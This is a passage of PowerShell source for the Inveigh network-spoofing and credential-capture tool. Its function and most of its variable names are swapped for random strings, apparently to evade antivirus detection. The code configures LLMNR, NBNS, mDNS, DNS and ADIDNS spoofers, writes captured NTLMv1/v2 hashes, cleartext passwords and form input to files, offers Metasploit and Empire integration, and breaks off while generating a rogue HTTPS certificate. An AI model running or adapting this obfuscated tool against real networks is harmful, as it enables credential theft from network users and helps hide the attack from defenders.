function bloodthirstiness
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Array]$eNGAuPPB99 = ("isatap","wpad"),
    [parameter(Mandatory=$false)][Array]$kvoRCffi99 = "",
    [parameter(Mandatory=$false)][Array]$xZwnRmnl99 = "Firefox",
    [parameter(Mandatory=$false)][Array]$CBlLlQgp99 = ("139","445"),
    [parameter(Mandatory=$false)][Array]$oCOyAgdf99 = "",
    [parameter(Mandatory=$false)][Array]$aaGIoVaU99 = "",
    [parameter(Mandatory=$false)][Array]$DzGorPak99 = "",
    [parameter(Mandatory=$false)][Array]$VBgThnPx99 = "",
    [parameter(Mandatory=$false)][Array]$SDnpWGxP99 = "",
    [parameter(Mandatory=$false)][Array]$ISkZwfFc99 = "",
    [parameter(Mandatory=$false)][Array]$GvqEXUZu99 = "Firefox",
    [parameter(Mandatory=$false)][Int]$hTlToBCy99 = "-1",
    [parameter(Mandatory=$false)][Int]$TwzNLFBf99 = "",
    [parameter(Mandatory=$false)][Int]$EIAKYMzI99 = "4",
    [parameter(Mandatory=$false)][Int]$SQvPCXcG99 = "600",
    [parameter(Mandatory=$false)][Int]$JApKCTck99 = "30",
    [parameter(Mandatory=$false)][Int]$uuWWIRDe99 = "80",
    [parameter(Mandatory=$false)][Int]$ErJSnLHL99 = "443",
    [parameter(Mandatory=$false)][Int]$NkBYNNgQ99 = "2",
    [parameter(Mandatory=$false)][Int]$IEFYrrrG99 = "30",
    [parameter(Mandatory=$false)][Int]$VzyZNqnS99 = "120",
    [parameter(Mandatory=$false)][Int]$ZMtTESED99 = "165",
    [parameter(Mandatory=$false)][Int]$FLmqCpEm99 = "",
    [parameter(Mandatory=$false)][Int]$SvSyggKE99 = "8492",
    [parameter(Mandatory=$false)][Int]$GIZTcqVL99 = "",
    [parameter(Mandatory=$false)][Int]$gyFkhRAU99 = "",
    [parameter(Mandatory=$false)][Int]$pJbruVRt99 = "",
    [parameter(Mandatory=$false)][Int]$eqnDzsgQ99 = "",
    [parameter(Mandatory=$false)][Int]$xeByEGnv99 = "30",
    [parameter(Mandatory=$false)][Int]$aqPCuNat99 = "0",
    [parameter(Mandatory=$false)][Int]$UlUbQxYF99 = "0",
    [parameter(Mandatory=$false)][String]$eYIjtbUX99 = "",
    [parameter(Mandatory=$false)][String]$aADJnjNS99 = "",
    [parameter(Mandatory=$false)][String]$irVhQGBY99 = "",
    [parameter(Mandatory=$false)][String]$UXTcPCVe99 = "wpad",
    [parameter(Mandatory=$false)][String]$qMKhaLNb99 = "wpad2",
    [parameter(Mandatory=$false)][String]$bBSwGtbL99 = "",
    [parameter(Mandatory=$false)][String]$ronDUKWy99 = "ADFS",
    [parameter(Mandatory=$false)][String]$nKkxBvGh99 = "text/html",
    [parameter(Mandatory=$false)][String]$OHQVRNnZ99 = "",
    [parameter(Mandatory=$false)][String]$DYCiYqcl99 = "",
    [parameter(Mandatory=$false)][String]$SvQlrCWB99 = "",
    [parameter(Mandatory=$false)][String]$Gqwulcgs99 = "Inveigh",
    [parameter(Mandatory=$false)][String]$QjQQBRRb99 = "localhost",
    [parameter(Mandatory=$false)][String]$FADzjcAe99 = "WPAD",
    [parameter(Mandatory=$false)][String]$mooPFzLL99 = "function FindProxyForURL(url,host){return `"DIRECT`";}",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$OpSametq99 = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$hpsuzKWY99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$watihopW99,
    [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$pZPlOUmA99 = "DomainDNSZones",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$TdCLPmgP99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ozNfTVeL99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$DNS = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$rosmaqHG99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OYEydmkn99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LiCXQovl99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$tQETvOZJ99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$YQiNABub99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$amzQkCjG99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$hNaHSLnV99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$mDNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$nXjSZCTI99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$fFAXuICj99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$nOCBdgwy99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMB = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$TureDGKs99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$kbfXrXcm99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WfEKENoc99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$VNjaTNRL99 = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$wnufgKLy99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$liSaTCmu99 = "N",
    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$hGlcaZbQ99 = "Auto",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$mQkdAcSO99 = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$GSmWUQVj99 = @("QU"),
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$tPiDssiv99 = @("00","20"),
    [parameter(Mandatory=$false)][ValidateSet("File","Memory")][String]$Pcap = "",
    [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$jgnMssFI99 = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$cWbsxIoQ99 = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$rHCPryid99,
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$yAVqlFre99 = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$uzYCVpkd99 = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$UbhtORQL99 = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$nhjjrWtK99 = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$uXKhDCWf99 = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$zwiuIZeM99 = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$tMqwMtTz99 = "",
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$wtlMKEkf99,
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$mPKrHuBF99,
    [parameter(Mandatory=$false)][Switch]$FpxqDLtp99,
    [parameter(ValueFromRemainingArguments=$true)]$ovkaYEik99
)
if($ovkaYEik99)
{
    Write-Output "[-] $($ovkaYEik99) is not a valid parameter"
    throw
}
$OSzMhHmD99 = "1.506"
if(!$IP)
{ 
    try
    {
        $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
    }
    catch
    {
        Write-Output "[-] Error finding local IP, specify manually with -IP"
        throw
    }
}
if(!$zwiuIZeM99)
{
    $zwiuIZeM99 = $IP
}
if($watihopW99)
{
    if(!$aADJnjNS99 -or !$eYIjtbUX99 -or $irVhQGBY99 -or !$bBSwGtbL99)
    {
        try
        {
            $zXrhruJN99 = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }
        if(!$aADJnjNS99)
        {
            $aADJnjNS99 = $zXrhruJN99.PdcRoleOwner.Name
        }
    
        if(!$eYIjtbUX99)
        {
            $eYIjtbUX99 = $zXrhruJN99.Name
        }
        if(!$irVhQGBY99)
        {
            $irVhQGBY99 = $zXrhruJN99.Forest
        }
    
        if(!$bBSwGtbL99)
        {
            $bBSwGtbL99 = $zXrhruJN99.Name
        }
    }
}
if($OHQVRNnZ99 -or $DYCiYqcl99)
{
    if(!$uzYCVpkd99)
    {
        Write-Output "[-] You must specify an -HTTPDir when using either -OHQVRNnZ99 or -DYCiYqcl99"
        throw
    }
}
if($YQiNABub99 -eq 'Y' -and !$mPKrHuBF99 -and !$rHCPryid99)
{
    Write-Output "[-] You must specify a -mPKrHuBF99 or -rHCPryid99 when enabling Kerberos capture"
    throw
}
if($tMqwMtTz99 -or $pJbruVRt99)
{
    if(!$tMqwMtTz99)
    {
        Write-Output "[-] You must specify a -pJbruVRt99 to go with -tMqwMtTz99"
        throw
    }
    if(!$pJbruVRt99)
    {
        Write-Output "[-] You must specify a -tMqwMtTz99 to go with -pJbruVRt99"
        throw
    }
}
if($nXjSZCTI99 -eq 'Y' -and !$nhjjrWtK99)
{
    Write-Output "[-] You must specify a -nhjjrWtK99 if enabling -nXjSZCTI99"
    throw
}
if(!$yAVqlFre99)
{ 
    $HHgEZHCn99 = $PWD.Path
}
else
{
    $HHgEZHCn99 = $yAVqlFre99
}
if(!$wzCNZfgp99)
{
    $dAkSnGeo99:inveigh = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.cleartext_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.enumerate = New-Object System.Collections.ArrayList
    $wzCNZfgp99.IP_capture_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.log = New-Object System.Collections.ArrayList
    $wzCNZfgp99.kerberos_TGT_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.NTLMv1_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.NTLMv2_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.POST_request_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.valid_host_list = New-Object System.Collections.ArrayList
    $wzCNZfgp99.ADIDNS_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.relay_privilege_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.relay_failed_login_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.relay_history_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.request_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.session_socket_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.session_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.session_message_ID_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.session_lock_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.SMB_session_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.domain_mapping_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.group_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.session_count = 0
    $wzCNZfgp99.session = @()
}
if($wzCNZfgp99.running)
{
    Write-Output "[-] Inveigh is already running"
    throw
}
$wzCNZfgp99.stop = $false
if(!$wzCNZfgp99.relay_running)
{
    $wzCNZfgp99.cleartext_file_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.console_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.log_file_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.output_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.POST_request_file_queue = New-Object System.Collections.ArrayList
    $wzCNZfgp99.HTTP_session_table = [HashTable]::Synchronized(@{})
    $wzCNZfgp99.console_input = $true
    $wzCNZfgp99.console_output = $false
    $wzCNZfgp99.file_output = $false
    $wzCNZfgp99.HTTPS_existing_certificate = $false
    $wzCNZfgp99.HTTPS_force_certificate_delete = $false
    $wzCNZfgp99.log_output = $true
    $wzCNZfgp99.cleartext_out_file = $HHgEZHCn99 + "\Inveigh-Cleartext.txt"
    $wzCNZfgp99.log_out_file = $HHgEZHCn99 + "\Inveigh-Log.txt"
    $wzCNZfgp99.NTLMv1_out_file = $HHgEZHCn99 + "\Inveigh-NTLMv1.txt"
    $wzCNZfgp99.NTLMv2_out_file = $HHgEZHCn99 + "\Inveigh-NTLMv2.txt"
    $wzCNZfgp99.POST_request_out_file = $HHgEZHCn99 + "\Inveigh-FormInput.txt"
}
if($hGlcaZbQ99 -eq 'Auto')
{
    $JQAOpCUk99 = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}
else
{
 
    if($hGlcaZbQ99 -eq 'Y')
    {
        $imhaTEzK99 = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
        $JQAOpCUk99 = $true
    }
    else
    {
        $JQAOpCUk99 = $false
    }
    
}
if($wnufgKLy99 -eq 'Y')
{
    $BXdlriHx99 = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
    if($HTTP -eq 'Y')
    {
        $wiMqOsQQ99 = netstat -anp TCP | findstr LISTENING | findstr /C:"$UbhtORQL99`:$uuWWIRDe99 "
    }
    if($HTTPS -eq 'Y')
    {
        $FuneOTeR99 = netstat -anp TCP | findstr LISTENING | findstr /C:"$UbhtORQL99`:$ErJSnLHL99 "
    }
    if($Proxy -eq 'Y')
    {
        $CNTpZrSy99 = netstat -anp TCP | findstr LISTENING | findstr /C:"$UbhtORQL99`:$SvSyggKE99 "
    }
    if($DNS -eq 'Y' -and !$JQAOpCUk99)
    {
        $GUkkLGdk99 = netstat -anp UDP | findstr /C:"0.0.0.0:53 "
        $GUkkLGdk99 = $false
    }
    if($LLMNR -eq 'Y' -and !$JQAOpCUk99)
    {
        $ccUDSUTB99 = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
        $ccUDSUTB99 = $false
    }
    if($mDNS -eq 'Y' -and !$JQAOpCUk99)
    {
        $aXvuSfMv99 = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
    }
}
if(!$JQAOpCUk99)
{
    if($HTTPS -eq 'Y')
    {
        Write-Output "[-] HTTPS requires elevated privileges"
        throw
    }
    if($TureDGKs99 -eq 'Y')
    {
        Write-Output "[-] SpooferLearning requires elevated privileges"
        throw
    }
    if($Pcap -eq 'File')
    {
        Write-Output "[-] Pcap file output requires elevated privileges"
        throw
    }
    if(!$PSBoundParameters.ContainsKey('NBNS'))
    {
        $NBNS = "Y"
    }
    $SMB = "N"
}
$wzCNZfgp99.hostname_spoof = $false
$wzCNZfgp99.running = $true
if($VNjaTNRL99 -eq 'Y')
{
    $wzCNZfgp99.status_output = $true
}
else
{
    $wzCNZfgp99.status_output = $false
}
if($fFAXuICj99 -eq 'Y')
{
    $wzCNZfgp99.output_stream_only = $true
}
else
{
    $wzCNZfgp99.output_stream_only = $false
}
if($FpxqDLtp99)
{
    if($JQAOpCUk99)
    {
        $DNS = "N"
        $LLMNR = "N"
        $mDNS = "N"
        $NBNS = "N"
        $HTTP = "N"
        $HTTPS = "N"
        $Proxy = "N"
    }
    else
    {
        $HTTP = "N"
        $HTTPS = "N"
        $Proxy = "N"
    }
}
if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $wzCNZfgp99.tool = 1
    $wzCNZfgp99.output_stream_only = $true
    $wzCNZfgp99.newline = $null
    $liSaTCmu99 = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $wzCNZfgp99.tool = 2
    $wzCNZfgp99.output_stream_only = $true
    $wzCNZfgp99.console_input = $false
    $wzCNZfgp99.newline = $null
    $amzQkCjG99 = "N"
    $nOCBdgwy99 = "N"
    switch ($liSaTCmu99)
    {
        'Low'
        {
            $liSaTCmu99 = "Low"
        }
        'Medium'
        {
            $liSaTCmu99 = "Medium"
        }
        default
        {
            $liSaTCmu99 = "Y"
        }
    }
}
else
{
    $wzCNZfgp99.tool = 0
    $wzCNZfgp99.newline = $null
}
$wzCNZfgp99.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value
$wzCNZfgp99.computer_name = (Get-ChildItem -path env:computername).Value
try
{
    $wzCNZfgp99.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
    $wzCNZfgp99.DNS_computer_name = ($wzCNZfgp99.computer_name + "." + $wzCNZfgp99.DNS_domain).ToLower()
    if(!$wzCNZfgp99.domain_mapping_table.($wzCNZfgp99.netBIOS_domain))
    {
        $wzCNZfgp99.domain_mapping_table.Add($wzCNZfgp99.netBIOS_domain,$wzCNZfgp99.DNS_domain)
    }
}
catch
{
    $wzCNZfgp99.DNS_domain = $wzCNZfgp99.netBIOS_domain
    $wzCNZfgp99.DNS_computer_name = $wzCNZfgp99.computer_name
}
$wzCNZfgp99.output_queue.Add("[*] Inveigh $OSzMhHmD99 started at $(Get-Date -format s)") > $null
if($hGlcaZbQ99 -eq 'Y' -or $JQAOpCUk99)
{
    if(($hGlcaZbQ99 -eq 'Auto' -and $JQAOpCUk99) -or ($hGlcaZbQ99 -eq 'Y' -and $imhaTEzK99))
    {
        $wzCNZfgp99.output_queue.Add("[+] Elevated Privilege Mode = Enabled")  > $null
    }
    else
    {
        $wzCNZfgp99.output_queue.Add("[-] Elevated Privilege Mode Enabled But Check Failed")  > $null
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[!] Elevated Privilege Mode = Disabled")  > $null
    $SMB = "N"
}
if($BXdlriHx99)
{
    $wzCNZfgp99.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
}
$wzCNZfgp99.output_queue.Add("[+] Primary IP Address = $IP")  > $null
if($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')
{
    $wzCNZfgp99.output_queue.Add("[+] Spoofer IP Address = $zwiuIZeM99")  > $null
}
if($LLMNR -eq 'Y' -or $NBNS -eq 'Y')
{
    if($aqPCuNat99 -gt 0)
    {
        $wzCNZfgp99.output_queue.Add("[+] Spoofer Threshold Host = $aqPCuNat99")  > $null
    }
    if($UlUbQxYF99 -gt 0)
    {
        $wzCNZfgp99.output_queue.Add("[+] Spoofer Threshold Network = $UlUbQxYF99")  > $null
    }
    
}
if($watihopW99)
{
    $wzCNZfgp99.ADIDNS = $watihopW99
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS Spoofer = $watihopW99")  > $null
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS Hosts Ignore = " + ($eNGAuPPB99 -join ","))  > $null
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS Domain Controller = $aADJnjNS99")  > $null
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS Domain = $eYIjtbUX99")  > $null
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS Forest = $irVhQGBY99")  > $null
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS TTL = $SQvPCXcG99")  > $null
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS Zone = $bBSwGtbL99")  > $null
    if($wzCNZfgp99.ADIDNS -contains 'NS')
    {
        $wzCNZfgp99.output_queue.Add("[+] ADIDNS NS Record = $UXTcPCVe99")  > $null
        $wzCNZfgp99.output_queue.Add("[+] ADIDNS NS Target Record = $qMKhaLNb99")  > $null
    }
    if($TdCLPmgP99 -eq 'Y')
    {
        $wzCNZfgp99.output_queue.Add("[+] ADIDNS ACE Add = Enabled")  > $null
    }
    else
    {
        $wzCNZfgp99.output_queue.Add("[+] ADIDNS ACE Add = Disabled")  > $null    
    }
    if($ozNfTVeL99 -eq 'Y')
    {
        $wzCNZfgp99.output_queue.Add("[+] ADIDNS Cleanup = Enabled")  > $null
    }
    else
    {
        $wzCNZfgp99.output_queue.Add("[+] ADIDNS Cleanup = Disabled")  > $null    
    }
    if($watihopW99 -eq 'Combo')
    {
        $wzCNZfgp99.request_table_updated = $true
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] ADIDNS Spoofer = Disabled")  > $null
}
if($DNS -eq 'Y')
{
    if($JQAOpCUk99 -or !$GUkkLGdk99)
    {
        $wzCNZfgp99.output_queue.Add("[+] DNS Spoofer = Enabled")  > $null
        $wzCNZfgp99.output_queue.Add("[+] DNS TTL = $JApKCTck99 Seconds")  > $null
    }
    else
    {
        $DNS = "N"
        $wzCNZfgp99.output_queue.Add("[-] DNS Spoofer Disabled Due To In Use Port 53")  > $null
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
}
if($LLMNR -eq 'Y')
{
    if($JQAOpCUk99 -or !$ccUDSUTB99)
    {
        $wzCNZfgp99.output_queue.Add("[+] LLMNR Spoofer = Enabled")  > $null
        $wzCNZfgp99.output_queue.Add("[+] LLMNR TTL = $IEFYrrrG99 Seconds")  > $null
    }
    else
    {
        $LLMNR = "N"
        $wzCNZfgp99.output_queue.Add("[-] LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] LLMNR Spoofer = Disabled")  > $null
}
if($mDNS -eq 'Y')
{
    if($JQAOpCUk99 -or !$aXvuSfMv99)
    {
        $QjuCGxaN99 = $GSmWUQVj99 -join ","
        if($GSmWUQVj99.Count -eq 1)
        {
            $wzCNZfgp99.output_queue.Add("[+] mDNS Spoofer For Type $QjuCGxaN99 = Enabled")  > $null
        }
        else
        {
            $wzCNZfgp99.output_queue.Add("[+] mDNS Spoofer For Types $QjuCGxaN99 = Enabled")  > $null
        }
        $wzCNZfgp99.output_queue.Add("[+] mDNS TTL = $VzyZNqnS99 Seconds")  > $null
    }
    else
    {
        $mDNS = "N"
        $wzCNZfgp99.output_queue.Add("[-] mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] mDNS Spoofer = Disabled")  > $null
}
if($NBNS -eq 'Y')
{
    $TprFiZTI99 = $tPiDssiv99 -join ","
    
    if($tPiDssiv99.Count -eq 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] NBNS Spoofer For Type $TprFiZTI99 = Enabled")  > $null
    }
    else
    {
        $wzCNZfgp99.output_queue.Add("[+] NBNS Spoofer For Types $TprFiZTI99 = Enabled")  > $null
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] NBNS Spoofer = Disabled")  > $null
}
if($nXjSZCTI99 -eq 'Y')
{   
    $wzCNZfgp99.output_queue.Add("[+] NBNS Brute Force Spoofer Target = $nhjjrWtK99") > $null
    $wzCNZfgp99.output_queue.Add("[+] NBNS Brute Force Spoofer IP Address = $zwiuIZeM99") > $null
    $wzCNZfgp99.output_queue.Add("[+] NBNS Brute Force Spoofer Hostname = $FADzjcAe99") > $null
    if($FLmqCpEm99)
    {
        $wzCNZfgp99.output_queue.Add("[+] NBNS Brute Force Pause = $FLmqCpEm99 Seconds") > $null
    }
}
if($NBNS -eq 'Y' -or $nXjSZCTI99 -eq 'Y')
{
    $wzCNZfgp99.output_queue.Add("[+] NBNS TTL = $ZMtTESED99 Seconds") > $null
}
if($TureDGKs99 -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $wzCNZfgp99.output_queue.Add("[+] Spoofer Learning = Enabled")  > $null
    if($eqnDzsgQ99 -eq 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] Spoofer Learning Delay = $eqnDzsgQ99 Minute")  > $null
    }
    elseif($eqnDzsgQ99 -gt 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] Spoofer Learning Delay = $eqnDzsgQ99 Minutes")  > $null
    }
    
    if($xeByEGnv99 -eq 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] Spoofer Learning Interval = $xeByEGnv99 Minute")  > $null
    }
    elseif($xeByEGnv99 -eq 0)
    {
        $wzCNZfgp99.output_queue.Add("[+] Spoofer Learning Interval = Disabled")  > $null
    }
    elseif($xeByEGnv99 -gt 1)
    {
        $wzCNZfgp99.output_queue.Add("[+] Spoofer Learning Interval = $xeByEGnv99 Minutes")  > $null
    }
}
if($aaGIoVaU99 -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $wzCNZfgp99.output_queue.Add("[+] Spoofer Hosts Reply = " + ($aaGIoVaU99 -join ","))  > $null
}
if($DzGorPak99 -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $wzCNZfgp99.output_queue.Add("[+] Spoofer Hosts Ignore = " + ($DzGorPak99 -join ","))  > $null
}
if($VBgThnPx99 -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $wzCNZfgp99.output_queue.Add("[+] Spoofer IPs Reply = " + ($VBgThnPx99 -join ","))  > $null
}
if($SDnpWGxP99 -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $wzCNZfgp99.output_queue.Add("[+] Spoofer IPs Ignore = " + ($SDnpWGxP99 -join ","))  > $null
}
if($WfEKENoc99 -eq 'N')
{
    $wzCNZfgp99.spoofer_repeat = $false
    $wzCNZfgp99.output_queue.Add("[+] Spoofer Repeating = Disabled")  > $null
}
else
{
    $wzCNZfgp99.spoofer_repeat = $true
}
if($SMB -eq 'Y' -and $JQAOpCUk99)
{
    $wzCNZfgp99.output_queue.Add("[+] SMB Capture = Enabled")  > $null
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] SMB Capture = Disabled")  > $null
}
if($HTTP -eq 'Y')
{
    if($wiMqOsQQ99)
    {
        $HTTP = "N"
        $wzCNZfgp99.output_queue.Add("[-] HTTP Capture Disabled Due To In Use Port $uuWWIRDe99")  > $null
    }
    else
    {
        if($UbhtORQL99 -ne '0.0.0.0')
        {
            $wzCNZfgp99.output_queue.Add("[+] HTTP IP = $UbhtORQL99") > $null
        }
        if($uuWWIRDe99 -ne 80)
        {
            $wzCNZfgp99.output_queue.Add("[+] HTTP Port = $uuWWIRDe99") > $null
        }
        $wzCNZfgp99.output_queue.Add("[+] HTTP Capture = Enabled")  > $null
    }
}
else
{
    $wzCNZfgp99.output_queue.Add("[+] HTTP Capture = Disabled")  > $null
}
if($HTTPS -eq 'Y')
{
    if($FuneOTeR99)
    {
        $HTTPS = "N"
        $wzCNZfgp99.HTTPS = $false
        $wzCNZfgp99.output_queue.Add("[-] HTTPS Capture Disabled Due To In Use Port $ErJSnLHL99")  > $null
    }
    else
    {
        try
        { 
            $wzCNZfgp99.certificate_issuer = $Gqwulcgs99
            $wzCNZfgp99.certificate_CN = $QjQQBRRb99
            $wzCNZfgp99.output_queue.Add("[+] HTTPS Certificate Issuer = " + $wzCNZfgp99.certificate_issuer)  > $null
            $wzCNZfgp99.output_queue.Add("[+] HTTPS Certificate CN = " + $wzCNZfgp99.certificate_CN)  > $null
            $fkZMhuXW99 = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $wzCNZfgp99.certificate_issuer})
            if(!$fkZMhuXW99)
            {
                $QqGXpBaZ99 = new-object -com "X509Enrollment.CX500DistinguishedName"
                $QqGXpBaZ99.Encode( "CN=" + $wzCNZfgp99.certificate_CN, $QqGXpBaZ99.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $bwMKEZNR99 = new-object -com "X509Enrollment.CX500DistinguishedName"
                $bwMKEZNR99.Encode("CN=" + $wzCNZfgp99.certificate_issuer, $QqGXpBaZ99.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $nauuGoDP99 = new-object -com "X509Enrollment.CX509PrivateKey"
                $nauuGoDP99.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
                $nauuGoDP99.KeySpec = 2
                $nauuGoDP99.Length = 2048
			    $nauuGoDP99.MachineContext = 1
                $nauuGoDP99.Create()
                $FSUGWJdD99 = new-object -com "X509Enrollment.CObjectId"
			    $FSUGWJdD99.InitializeFromValue("1.3.6.1.5.5.7.3.1")
			    $ZAxIueXK99 = new-object -com "X509Enrollment.CObjectIds.1"
			    $ZAxIueXK99.Add($FSUGWJdD99)
			    $nhvwKyaQ99 = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
